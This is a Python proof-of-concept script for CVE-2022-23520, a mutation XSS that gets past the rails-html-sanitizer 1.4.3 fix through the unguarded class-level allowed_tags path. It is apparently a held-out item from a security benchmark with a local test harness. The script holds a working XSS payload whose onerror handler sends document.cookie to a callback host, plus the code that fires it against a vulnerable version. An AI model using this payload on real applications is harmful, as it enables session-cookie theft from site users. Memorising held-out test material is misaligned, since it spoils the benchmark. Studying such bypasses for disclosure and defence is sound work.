#!/usr/bin/env python3
"""[HELD-OUT] CVE-2022-23520 residual -- the SAME `<select><style>` mutation XSS that bypasses the
CVE-2022-32209 (rails-html-sanitizer 1.4.3) fix by taking the CLASS-LEVEL allowed_tags path.

Same sink (Rails::Html::SafeListSanitizer#sanitize), same exfil channel as the seed, and the very
same select+style payload. The 1.4.3 fix added `remove_safelist_tag_combinations` (delete `style`
when `select` is also allowed) but wired it in ONLY on the per-call `options[:tags]` branch of
`allowed_tags`:

    def allowed_tags(options)
      if options[:tags]
        remove_safelist_tag_combinations(options[:tags])   # <- guarded
      else
        self.class.allowed_tags                            # <- CLASS-LEVEL fallback, NOT guarded
      end
    end

So an app that overrides tags GLOBALLY -- `config.action_view.sanitized_allowed_tags = [...]` /
`SafeListSanitizer.allowed_tags = [...]` -- and then calls `sanitize(html)` with NO `:tags` option
takes the `else` branch, which never runs `remove_safelist_tag_combinations`. `style` stays in the
safelist, the HTML4 parser emits the `<style>` CDATA `<img>` RAW (verified server-side), and the
browser re-parses it into a live `<img onerror>` -> flag exfiltrated. The 1.4.3 fix never covered
the class-level path -> INCOMPLETE FIX.

On V2 (rails-html-sanitizer 1.4.4, the CVE-2022-23520 fix) the serializer escapes everything the
HTML4 parser treats as CDATA (`Loofah::HTML5::Scrub.cdata_escape`), so the inner `<img>` is emitted
as `&lt;img ... &gt;` inside `<style>` regardless of how tags were configured -> inert -> BLOCKED.

advisory: GHSA-rrfc-7g8p-99q8 / CVE-2022-23520 ; writeup: "A Tale of Two XSS in the Rails HTML
Sanitizer" (Dominic Breuker).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import run_payload, CB  # noqa: E402

# IDENTICAL payload to the seed; only the API path (class-level, mode=class) differs. The class-level
# allowed_tags fallback skips remove_safelist_tag_combinations, so `style` stays in the safelist and
# the <svg><style> CDATA <img> is emitted RAW -> browser pulls it out of the SVG foreign content ->
# onerror fires -> flag. (Same CDATA-under-<style> mXSS class the 1.4.3 fix left reachable via the
# class-level path; 1.4.4's cdata_escape closes it.)
BYPASS_PAYLOAD = (
    "<svg><style>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\">"
    "</style></svg>"
)


def bypass_poc(*, version="v1"):
    """Run the CVE2 residual via the CLASS-LEVEL allowed_tags path on `version`; return callback dump
    (flag on V1)."""
    return run_payload(BYPASS_PAYLOAD, version, san_mode="class", visit_mode="load")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(bypass_poc(version=v))
